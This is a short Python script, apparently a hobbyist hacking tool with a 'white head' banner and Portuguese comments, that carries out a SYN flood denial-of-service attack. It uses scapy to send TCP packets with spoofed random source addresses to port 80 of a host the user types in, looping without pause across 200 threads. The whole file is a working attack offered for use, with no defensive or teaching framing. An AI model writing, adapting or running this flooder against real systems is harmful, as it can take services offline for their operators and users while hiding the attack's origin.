#!/usr/bin/python3

#Alterar a porta de a cordo com o destino


print ('\033[32m'"SYN - Flood"'\033[32m')
print ('\033[37m'"          _     _ _         _                    _  "'\033[37m')
print ('\033[37m'"         | |   (_) |       | |                  | | "'\033[37m')
print ('\033[37m'"__      _| |__  _| |_ ___  | |__   ___  __ _  __| | "'\033[37m')
print ('\033[37m'"\ \ /\ / / '_ \| | __/ _ \ | '_ \ / _ \/ _` |/ _` | "'\033[37m')
print ('\033[37m'" \ V  V /| | | | | ||  __/ | | | |  __/ (_| | (_| | "'\033[37m')
print ('\033[37m'"  \_/\_/ |_| |_|_|\__\___| |_| |_|\___|\__,_|\__,_| "'\033[37m')
print ("$$ BY:Sym0SYm $$")
print ("")

from scapy.all import *
import threading

destino = input("Digite o host:  ")
print ("Flooding in :80")
def flood():
    pacote = IP(src=RandIP("*.*.*.*"), dst= destino) / TCP(dport=80)#porta de destino#
    send(pacote, loop=1, inter=0)
for x in range(200):
    threading.Thread(target=flood).start()
